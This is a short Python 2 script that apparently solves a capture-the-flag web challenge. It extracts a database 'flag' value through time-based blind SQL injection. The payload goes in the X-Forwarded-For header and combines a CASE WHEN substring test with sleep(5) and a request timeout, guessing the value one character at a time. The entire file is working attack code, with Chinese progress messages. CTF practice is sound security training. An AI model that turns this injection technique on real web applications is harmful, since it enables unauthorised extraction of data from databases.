#coding:utf-8

import requests
import string

url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
chars=string.lowercase+string.uppercase+string.digits+string.punctuation

flags= ""
# tables_group=[]
for i in range(1,50):
    flag=0
    for str in chars:
        headers = {"X-forwarded-for":"'+"+"(select case when (substring((select flag from flag)from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(i,str)}
        try:
            resp=requests.get(url=url,headers=headers,timeout=4)
        except Exception as e:
            flags+=str
            flag=1
            print '正在扫描flag第%d个列，the clos now is '%(i+1) ,flags
            break
    if flag==0:
        break
    # print flags
    # tables_group.append(tables_name)
    if i==1 and flag==0:
        print '扫描完成'
        print "扫描结果-------",flags
        break


